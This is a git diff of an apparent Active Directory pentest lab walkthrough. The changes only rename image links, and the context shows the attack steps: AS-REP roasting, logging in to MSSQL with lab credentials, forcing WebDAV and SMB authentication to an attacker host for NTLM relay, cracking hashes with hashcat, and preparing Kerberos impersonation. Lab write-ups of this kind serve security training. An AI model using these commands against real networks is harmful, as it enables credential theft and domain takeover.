@@ -66,7 +66,7 @@ Other attacks which are possible to do is password spraying or checking if the u
 GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -outputfile asreproasting.txt
 ```
 
-![](<../../../.gitbook/assets/image (9) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)
 
 2\. The output doesn't show us any successes. But the file `kerberoasting.txt` is there and it has a hash for the user `richard`:
 
@@ -161,7 +161,7 @@ Richard can connect to the SQL server running on `WEB01` `10.0.0.5`. But he does
 mssqlclient.py -windows-auth 'amsterdam/richard:Sample123'@10.0.0.5
 ```
 
-![](<../../../.gitbook/assets/image (9) (1) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1) (1) (1).png>)
 
 ### 4. Become sysadmin
 
@@ -425,7 +425,7 @@ Lets force the webdav request back to our kali attacking machine:
 change-lockscreen -webdav \\webdav@80\
 ```
 
-![](<../../../.gitbook/assets/image (74) (1) (1).png>)
+![](<../../../.gitbook/assets/image (74) (1) (1) (1).png>)
 
 Once we check our NTLMRelay tool output we see that it succesfully authenticated as `WEB01$` to the LDAP port on the DC at `10.0.0.3`. And it says `FAKE01` can now impersonate users on `WEB01`.
 
@@ -569,7 +569,7 @@ EXEC('xp_fileexist ''\\192.168.248.2\pwn''') AT "DATA01.SECURE.LOCAL"
 .\hashcat.exe -a 0 -m 5600 .\hash.txt .\wordlists\rockyou.txt  -r .\rules\dive.rule
 ```
 
-![](<../../../.gitbook/assets/image (30).png>)
+![](<../../../.gitbook/assets/image (30) (1).png>)
 
 We successfully cracked the hash of the `sa_sql` user, the password is `Iloveyou2`.
 
@@ -743,7 +743,7 @@ $RawBytes = Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -S
 Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 S-1-5-21-1498997062-1091976085-892328878-1601 | Select-Object samaccountname
 ```
 
-![](<../../../.gitbook/assets/image (74) (1).png>)
+![](<../../../.gitbook/assets/image (74) (1) (1).png>)
 
 15\. The next step is to impersonate a user and request tickets so we can authenticate. We can create a CIFS service ticket using `FAKE01` impersonating the domain admin Administrator using impackets getST.py script. Fill in the password `123456`.
 
